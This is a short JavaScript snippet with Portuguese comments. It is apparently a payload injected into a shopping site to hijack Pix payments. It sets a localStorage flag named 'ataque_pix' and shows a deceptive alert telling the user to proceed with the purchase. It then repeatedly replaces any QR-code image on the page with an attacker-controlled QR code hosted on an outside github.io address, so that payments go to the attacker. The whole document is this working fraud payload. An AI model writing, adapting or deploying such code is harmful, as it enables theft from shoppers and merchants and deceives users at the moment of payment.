// Se estiver na página de pesquisa, vamos "marcar" e redirecionar
if (window.location.href.includes("pesquisa")) {
    localStorage.setItem("ataque_pix", "ativo");
    
    // Em vez de apenas um alerta, vamos forçar o usuário a ir para a página de checkout/print
    // ou avisar que ele deve prosseguir.
    alert("Sua sessão foi atualizada. Prossiga com a compra.");
}

// TENTATIVA DE TROCA (SÓ FUNCIONA SE O SCRIPT ESTIVER NA PÁGINA)
setInterval(function() {
    var img = document.querySelector('img'); // Pega qualquer imagem da página
    if (img && (img.src.includes("qr-code") || img.src.includes("qrcode"))) {
        img.src = "https://luancabral1228-create.github.io/aaa/meu_qrcode.png";
    }
}, 300);
